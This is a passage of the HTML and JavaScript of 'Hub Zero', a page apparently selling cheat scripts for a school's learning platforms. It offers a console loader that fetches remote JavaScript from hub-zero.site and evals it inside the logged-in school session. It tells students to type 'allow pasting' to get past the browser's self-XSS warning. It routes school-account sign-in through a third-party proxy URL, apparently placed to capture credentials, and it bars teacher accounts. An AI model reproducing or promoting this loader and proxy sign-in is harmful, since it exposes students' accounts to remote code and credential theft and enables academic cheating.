                <img src="Always_Correct.png" alt="EP always correct feature" loading="lazy">
              </div>
            </div>
            <div class="gallery-slide" data-index="4">
              <div class="gallery-card">
                <img src="Send_Cheer.png" alt="EP send cheer feature" loading="lazy">
              </div>
            </div>
            <div class="gallery-slide" data-index="5">
              <div class="gallery-card">
                <img src="Send_Cheer2.png" alt="EP send cheer details" loading="lazy">
              </div>
            </div>
            <div class="gallery-slide" data-index="6">
              <div class="gallery-card">
                <img src="Main_EP_UI.png" alt="EP Script Hub main dashboard" loading="lazy">
              </div>
            </div>
          </div>
        </div>
        <button class="gallery-nav-btn next" id="gallery-next" aria-label="Next image">
          <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2.5" fill="none"><polyline points="9 18 15 12 9 6"></polyline></svg>
        </button>
      </div>

      <div class="gallery-indicators" id="gallery-dots"></div>
    </div>
  </section>

  <!-- CTA -->
  <section class="cta-section" id="get-scripts">
    <div class="cta-box reveal">
      <p class="section-label" style="justify-content:center; margin-bottom:16px;">Ready to go?</p>
      <h2 class="section-title">Get the<br><em>scripts now!</em></h2>
      <p class="cta-tagline">Link your realm to get started</p>
      <button class="btn btn-primary" id="btn-get-loader-2" style="font-size:13px; padding:16px 40px;">Link realm (Get scripts)</button>
      <p class="cta-note">Microsoft edge required</p>
    </div>
  </section>

</div><!-- /non-logged-sections -->

<!-- ─── DASHBOARD (LOGGED IN) ─── -->
<div class="dashboard-section" id="logged-sections">
  <div class="dashboard-inner">
    
    <!-- Script Loader -->
    <div class="loader-card-box" id="dashboard">
      <p class="section-label">Your loader script</p>
      <h2 class="section-title">Scripts <em>Loader.</em></h2>
      <p class="dashboard-desc">This is the loader for Hub Zero. Your account as been whitelisted. Run this in the browser console on Realm or EP</p>

      <div class="code-box">
        <input class="code-input" id="loader-code-input" type="text" readonly value="javascript:fetch('https://hub-zero.site/loader.js').then(r=>r.text()).then(eval)">
        <button class="code-copy-btn" id="btn-copy-loader">Copy</button>
      </div>

      <div class="code-meta-hint">
        <span>Tip: To open console on Realm or EP run <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>J</kbd></span>
      </div>
    </div>

    <!-- Troubleshooting: Allow Pasting -->
    <div class="allow-pasting-box" id="common-issues">
      <div class="pasting-badge">
        <svg viewBox="0 0 24 24" width="13" height="13" stroke="currentColor" stroke-width="2.5" fill="none"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
        <span>Common Issues</span>
      </div>
      <h3 class="pasting-title">Make sure to allow pasting</h3>
      <p class="pasting-desc">
        If you receive an error like <em>"Content from the internet can be harmful, don't paste code you don't understand"</em>, simply type <kbd class="pasting-kbd">allow pasting</kbd> into the console and submit. You should be all good to paste the script from there.
      </p>
    </div>

  </div>
</div>

<!-- ─── FOOTER ─── -->
<footer>
  <div class="footer-inner">
    <div class="footer-brand">
      <div class="footer-logo">Hub <em>Zero.</em></div>
      <p>Custom scripts for EP &amp; Realm.</p>
    </div>
    <div class="footer-meta">
      <span>2026</span>
      <span>By Xylos</span>
    </div>
  </div>
</footer>

<!-- ─── MODAL ─── -->
<div class="modal-overlay" id="modal-overlay">
  <div class="modal-box">

    <!-- Edge warning -->
    <div class="modal-step" id="modal-step-edge">
      <p class="modal-label">Browser check</p>
      <h3 class="modal-title red">Edge Required</h3>
      <p class="modal-body">Hub Zero only works in <strong>Microsoft Edge</strong>. Please open this page in Edge and try again.</p>
      <div class="modal-footer">
        <button class="btn btn-danger" id="btn-edge-close">Close</button>
      </div>
    </div>

    <!-- Setup checklist -->
    <div class="modal-step" id="modal-step-setup">
      <h3 class="modal-title green" style="margin-bottom: 22px; font-size: 22px; letter-spacing: -0.02em;">BEFORE YOU CONTINUE...</h3>

      <div class="modal-scroll">
        <div class="modal-section">
          <p class="modal-section-title">Getting the script</p>
          <p class="modal-section-text">Continue to load Realm Sign on to link your Realm account. You will be verified and added to our system.</p>
          <label class="modal-check-label">
            <input type="checkbox" class="setup-checkbox" id="chk-setup-1">
            <span>I understand and agree to link my Realm account</span>
          </label>
        </div>

        <div class="modal-section">
          <p class="modal-section-title">Using the script</p>
          <p class="modal-section-text">On either Realm or EP run the sequence <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>J</kbd> to open the console. Simply paste the loader there.</p>
          <label class="modal-check-label">
            <input type="checkbox" class="setup-checkbox" id="chk-setup-2">
            <span>I understand how to paste and run the loader in console</span>
          </label>
        </div>

        <div class="modal-section">
          <p class="modal-section-title">Help</p>
          <p class="modal-section-text">Common issues will be posted on logged in site as they are found by us. <strong>IF YOU GET AN ERROR WHILE PASTING THE SCRIPT TYPE <kbd>"allow pasting"</kbd> INTO THE CONSOLE</strong></p>
          <label class="modal-check-label">
            <input type="checkbox" class="setup-checkbox" id="chk-setup-3">
            <span>I understand to type "allow pasting" if blocked</span>
          </label>
        </div>

        <div class="modal-warning-subtle">
          ATTEMPTING TO REVERSE ENGINEER OUR SCRIPTS WILL ALERT US AND YOU WILL BE BLACKLISTED. TEACHER ACCOUNTS WILL BE BLACKLISTED.
        </div>
      </div>

      <div class="modal-footer">
        <button class="btn btn-secondary" id="btn-setup-cancel">Cancel</button>
        <button class="btn btn-primary" id="btn-setup-continue" disabled>Continue</button>
      </div>
    </div>

    <!-- Redirecting -->
    <div class="modal-step" id="modal-step-redirect">
      <div class="modal-redirect">
        <h3 class="modal-title green">Redirecting to Realm<span class="redirect-dots" id="redirect-dots">.</span></h3>
        <p class="modal-body" style="margin-bottom:0;">Taking you to sign in with your school account...</p>
      </div>
    </div>

  </div>
</div>

<!-- ─── LIGHTBOX OVERLAY ─── -->
<div class="lightbox-overlay" id="lightbox-overlay">
  <button class="lightbox-close" id="lightbox-close" title="Close">&times;</button>
  <img class="lightbox-image" id="lightbox-image" src="" alt="Full size preview">
</div>

<script>
  /* ─── LOADER ─── */
  window.addEventListener('load', () => {
    setTimeout(() => {
      document.getElementById('loader').classList.add('gone');
      document.getElementById('main-nav').classList.add('show');
      // Hero reveal
      document.getElementById('hero-eyebrow').classList.add('show');
      setTimeout(() => {
        document.getElementById('line1').classList.add('show');
        document.getElementById('line2').classList.add('show');
      }, 100);
      setTimeout(() => {
        document.getElementById('hero-sub').classList.add('show');
        document.getElementById('hero-actions-anon').classList.add('show');
        document.getElementById('scroll-hint').classList.add('show');
      }, 200);
    }, 600);
  });

  /* ─── PROGRESS ─── */
  const progress = document.getElementById('progress');
  window.addEventListener('scroll', () => {
    const pct = window.scrollY / (document.body.scrollHeight - window.innerHeight) * 100;
    progress.style.width = Math.min(pct, 100) + '%';
  }, { passive: true });

  /* ─── SCROLL REVEAL ─── */
  const revealObs = new IntersectionObserver(entries => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        e.target.classList.add('visible');
        revealObs.unobserve(e.target);
      }
    });
  }, { threshold: 0.12, rootMargin: '0px 0px -40px 0px' });
  document.querySelectorAll('.reveal').forEach(el => revealObs.observe(el));

  /* ─── SESSION CHECK ─── */
  const isEdge = /Edg/i.test(navigator.userAgent);

  (async function verifySession() {
    const stored = localStorage.getItem('Signed_in');
    if (!stored) return;
    try {
      const data = JSON.parse(stored);
      const id = data.id;
      if (!id) return;

      const sbKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlub2xmdmpwaWt0bXJocXl2bnNoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5MjU5NDUsImV4cCI6MjEwMDUwMTk0NX0.gurNKy0vtMfVMW-To_2kyvMpQhEPpq7bKkJnyNN2qAc';
      const headers = { 'apikey': sbKey, 'Authorization': 'Bearer ' + sbKey };

      // Blacklist check
      const blRes = await fetch('https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/blacklisted_students?id=eq.' + encodeURIComponent(id), { headers });
      if (blRes.ok) {
        const bl = await blRes.json();
        if (bl && bl.length > 0) {
          localStorage.removeItem('Signed_in');
          alert('Blacklisted: ' + bl[0].reason);
          window.location.reload();
          return;
        }
      }

      // Registration check
      const vRes = await fetch('https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/verified_students?id=eq.' + encodeURIComponent(id), { headers });
      if (vRes.ok) {
        const records = await vRes.json();
        if (!records || records.length === 0) {
          localStorage.removeItem('Signed_in');
          alert('Account error. Please log in again.');
          window.location.reload();
          return;
        }
      }

      // Show logged-in state
      setLoggedInUI(data.name);
    } catch (e) {
      console.error('Session error:', e);
    }
  })();

  function setLoggedInUI(name) {
    document.getElementById('nav-non-logged').style.display = 'none';
    document.getElementById('nav-logged').style.display = 'flex';
    document.getElementById('non-logged-sections').style.display = 'none';
    document.getElementById('logged-sections').style.display = 'block';
    const welcome = document.getElementById('logged-in-welcome');
    welcome.style.display = 'block';
    document.getElementById('hero-actions-anon').style.display = 'none';
    document.getElementById('welcome-username').textContent = name;
    document.getElementById('scroll-hint').style.display = 'none';
  }

  /* ─── VERIFICATION CALLBACK ─── */
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.get('verified') === 'true') {
    const name = urlParams.get('name') || '';
    const id = urlParams.get('id') || '';
    (async function() {
      try {
        const sbKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imlub2xmdmpwaWt0bXJocXl2bnNoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ5MjU5NDUsImV4cCI6MjEwMDUwMTk0NX0.gurNKy0vtMfVMW-To_2kyvMpQhEPpq7bKkJnyNN2qAc';
        const headers = { 'apikey': sbKey, 'Authorization': 'Bearer ' + sbKey };

        const blRes = await fetch('https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/blacklisted_students?id=eq.' + encodeURIComponent(id), { headers });
        if (blRes.ok) {
          const bl = await blRes.json();
          if (bl && bl.length > 0) {
            alert('Access Denied: You are blacklisted. Reason: ' + bl[0].reason);
            window.history.replaceState({}, document.title, window.location.pathname);
            return;
          }
        }

        localStorage.setItem('Signed_in', JSON.stringify({ name, id }));

        const sbUrl = 'https://inolfvjpiktmrhqyvnsh.supabase.co/rest/v1/student_usage_limits';
        const checkRes = await fetch(sbUrl + '?id=eq.' + encodeURIComponent(id), { headers });
        const limitsData = await checkRes.json();

        if (!limitsData || limitsData.length === 0) {
          await fetch(sbUrl, {
            method: 'POST',
            headers: { ...headers, 'Content-Type': 'application/json', 'Prefer': 'return=minimal' },
            body: JSON.stringify({ id, cheers_pool_remaining: 500, last_pool_reset: new Date().toISOString() })
          });
        }

        alert('Verified!');
        window.history.replaceState({}, document.title, window.location.pathname);
        window.location.reload();
      } catch (err) {
        console.error('Verification callback error:', err);
      }
    })();
  }

  /* ─── DASHBOARD CONTROLS ─── */
  const heroGetScriptBtn = document.getElementById('btn-hero-get-script');
  if (heroGetScriptBtn) {
    heroGetScriptBtn.addEventListener('click', () => {
      const dash = document.getElementById('dashboard');
      if (dash) {
        dash.scrollIntoView({ behavior: 'smooth', block: 'center' });
        const input = document.getElementById('loader-code-input');
        if (input) {
          setTimeout(() => {
            input.focus();
            input.select();
          }, 450);
        }
      }
    });
  }

  const copyBtn = document.getElementById('btn-copy-loader');
  if (copyBtn) {
    copyBtn.addEventListener('click', () => {
      const input = document.getElementById('loader-code-input');
      input.select();
      navigator.clipboard.writeText(input.value).catch(() => {
        document.execCommand('copy');
      });
      copyBtn.textContent = 'Copied!';
      copyBtn.style.background = '#22c55e';
      copyBtn.style.borderColor = '#22c55e';
      copyBtn.style.color = '#fff';
      setTimeout(() => {
        copyBtn.textContent = 'Copy';
        copyBtn.style.background = '';
        copyBtn.style.borderColor = '';
        copyBtn.style.color = '';
      }, 1500);
    });
  }

  const relinkBtn = document.getElementById('btn-relink-realm');
  if (relinkBtn) relinkBtn.addEventListener('click', () => {
    window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au/';
  });

  const logoutBtn = document.getElementById('btn-logout-dashboard');
  if (logoutBtn) logoutBtn.addEventListener('click', () => {
    localStorage.removeItem('Signed_in');
    window.location.reload();
  });

  /* ─── SCRIPT CARDS → scroll to CTA ─── */
  document.querySelectorAll('.about-card').forEach(card => {
    card.addEventListener('click', () => {
      document.getElementById('get-scripts').scrollIntoView({ behavior: 'smooth', block: 'center' });
    });
  });

  /* ─── NAV & HERO CTA → scroll to CTA section ─── */
  const scrollToCTA = (e) => {
    e.preventDefault();
    const cta = document.getElementById('get-scripts');
    if (cta) cta.scrollIntoView({ behavior: 'smooth', block: 'center' });
  };

  const navGetScripts = document.getElementById('nav-get-scripts');
  if (navGetScripts) navGetScripts.addEventListener('click', scrollToCTA);

  const heroGetLoader = document.getElementById('btn-get-loader');
  if (heroGetLoader) heroGetLoader.addEventListener('click', scrollToCTA);

  /* ─── GALLERY CAROUSEL (3s auto-scroll) ─── */
  const galleryTrack = document.getElementById('gallery-track');
  const gallerySlides = document.querySelectorAll('.gallery-slide');
  const galleryDotsContainer = document.getElementById('gallery-dots');
  const prevBtn = document.getElementById('gallery-prev');
  const nextBtn = document.getElementById('gallery-next');
  let currentSlide = 0;
  let carouselTimer = null;

  if (galleryTrack && gallerySlides.length > 0) {
    gallerySlides.forEach((_, i) => {
      const dot = document.createElement('button');
      dot.className = 'gallery-dot' + (i === 0 ? ' active' : '');
      dot.setAttribute('aria-label', `Go to slide ${i + 1}`);
      dot.addEventListener('click', () => {
        goToSlide(i);
        restartCarouselTimer();
      });
      if (galleryDotsContainer) galleryDotsContainer.appendChild(dot);
    });

    const updateDots = () => {
      document.querySelectorAll('.gallery-dot').forEach((dot, i) => {
        dot.classList.toggle('active', i === currentSlide);
      });
    };

    const goToSlide = (index) => {
      currentSlide = (index + gallerySlides.length) % gallerySlides.length;
      galleryTrack.style.transform = `translateX(-${currentSlide * 100}%)`;
      updateDots();
    };

    const nextSlide = () => goToSlide(currentSlide + 1);
    const prevSlide = () => goToSlide(currentSlide - 1);

    if (nextBtn) nextBtn.addEventListener('click', () => { nextSlide(); restartCarouselTimer(); });
    if (prevBtn) prevBtn.addEventListener('click', () => { prevSlide(); restartCarouselTimer(); });

    const startCarouselTimer = () => {
      if (!carouselTimer) {
        carouselTimer = setInterval(nextSlide, 3000);
      }
    };

    const stopCarouselTimer = () => {
      if (carouselTimer) {
        clearInterval(carouselTimer);
        carouselTimer = null;
      }
    };

    const restartCarouselTimer = () => {
      stopCarouselTimer();
      startCarouselTimer();
    };

    const wrapper = document.querySelector('.gallery-carousel-wrapper');
    if (wrapper) {
      wrapper.addEventListener('mouseenter', stopCarouselTimer);
      wrapper.addEventListener('mouseleave', startCarouselTimer);
      wrapper.addEventListener('touchstart', stopCarouselTimer, { passive: true });
      wrapper.addEventListener('touchend', startCarouselTimer, { passive: true });
    }

    startCarouselTimer();
  }

  /* ─── MODAL ─── */
  const overlay = document.getElementById('modal-overlay');
  const stepEdge = document.getElementById('modal-step-edge');
  const stepSetup = document.getElementById('modal-step-setup');
  const stepRedirect = document.getElementById('modal-step-redirect');

  function showStep(step) {
    [stepEdge, stepSetup, stepRedirect].forEach(s => s.classList.remove('show'));
    step.classList.add('show');
  }

  function openModal() {
    document.body.classList.add('modal-open');
    overlay.classList.add('active');
    if (!isEdge) {
      showStep(stepEdge);
    } else {
      showStep(stepSetup);
    }
  }

  function closeModal() {
    overlay.classList.remove('active');
    document.body.classList.remove('modal-open');
    if (chk1) chk1.checked = false;
    if (chk2) chk2.checked = false;
    if (chk3) chk3.checked = false;
    if (btnContinue) btnContinue.disabled = true;
  }

  const btnGetLoader2 = document.getElementById('btn-get-loader-2');
  if (btnGetLoader2) btnGetLoader2.addEventListener('click', openModal);

  const btnEdgeClose = document.getElementById('btn-edge-close');
  if (btnEdgeClose) btnEdgeClose.addEventListener('click', closeModal);

  const btnSetupCancel = document.getElementById('btn-setup-cancel');
  if (btnSetupCancel) btnSetupCancel.addEventListener('click', closeModal);

  const chk1 = document.getElementById('chk-setup-1');
  const chk2 = document.getElementById('chk-setup-2');
  const chk3 = document.getElementById('chk-setup-3');
  const btnContinue = document.getElementById('btn-setup-continue');

  const updateContinueState = () => {
    if (btnContinue && chk1 && chk2 && chk3) {
      btnContinue.disabled = !(chk1.checked && chk2.checked && chk3.checked);
    }
  };

  [chk1, chk2, chk3].forEach(c => {
    if (c) c.addEventListener('change', updateContinueState);
  });

  if (btnContinue) {
    btnContinue.addEventListener('click', () => {
      showStep(stepRedirect);

      let dotCount = 1;
      const dotsSpan = document.getElementById('redirect-dots');
      const interval = setInterval(() => {
        dotCount = (dotCount % 3) + 1;
        if (dotsSpan) dotsSpan.textContent = '.'.repeat(dotCount);
      }, 400);

      setTimeout(() => {
        clearInterval(interval);
        overlay.style.background = '#000';
        document.querySelector('.modal-box').style.display = 'none';
        window.location.href = 'http://residential-6k3h.onrender.com/proxy?url=https://realm.stpatricks.qld.edu.au/';
      }, 2000);
    });
  }

  // Close setup modal on overlay click (outside box)
  if (overlay) {
    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) closeModal();
    });
  }

  // Lightbox Zoom Logic
  const lightbox = document.getElementById('lightbox-overlay');
  const lightboxImg = document.getElementById('lightbox-image');
  const lightboxClose = document.getElementById('lightbox-close');

  document.querySelectorAll('.gallery-slide img').forEach(img => {
    img.addEventListener('click', (e) => {
      e.stopPropagation();
      if (lightboxImg && lightbox) {
        lightboxImg.src = img.src;
        lightboxImg.alt = img.alt;
        lightbox.classList.add('active');
        document.body.style.overflow = 'hidden';
      }
    });
  });

  const closeLightbox = () => {
    if (lightbox) lightbox.classList.remove('active');
    if (!document.body.classList.contains('modal-open')) {
      document.body.style.overflow = '';
    }
  };

  if (lightboxClose) {
    lightboxClose.addEventListener('click', closeLightbox);
  }
  if (lightbox) {
    lightbox.addEventListener('click', (e) => {
      if (e.target === lightbox || e.target === lightboxImg) {
        closeLightbox();
      }
    });
  }
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeLightbox();
  });
</script>
</body>
</html>
